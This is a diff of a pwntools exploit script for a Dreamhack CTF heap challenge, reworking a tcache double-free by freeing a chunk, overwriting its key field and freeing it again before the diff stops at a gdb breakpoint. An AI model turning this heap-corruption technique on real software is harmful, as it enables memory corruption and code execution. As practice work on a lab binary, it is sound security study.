@@ -1,8 +1,8 @@
 from pwn import *
 
-LOCAL = False
+LOCAL = True
 if LOCAL:
-    p = process("./tcache_dup")
+    p = process("./tcache_dup2")
 else:
     PORT = int(input("PORT: "))
     HOST = int(input("HOST: "))
@@ -31,16 +31,19 @@ def delete(idx):
     p.sendafter("idx: ", str(idx))
 
 
-elf = ELF("./tcache_dup")
+elf = ELF("./tcache_dup2")
 libc = ELF("./libc-2.30.so")
 
 get_shell = elf.symbols["get_shell"]
 printf_got = elf.got["printf"]
 
-# [1] Tcache Duplication
-create(0x30, b"dreamhack")
+# [1] Tcache Duplication Considering Chunk Count
+create(0x10, b"dreamhack")  # idx: 0
+create(0x10, b"tcachedup")  # idx: 1
+delete(1)
 delete(0)
-modify(0, 0x30, b"A" * 8 + b"\x00")
+modify(0, 0x10, b"A" * 8 + b"\x00")
 delete(0)
-modify(0, 0x30, b"B" * 8 + b"\x01")
-delete(0)
+
+gdb.attach(p)
+# [2]
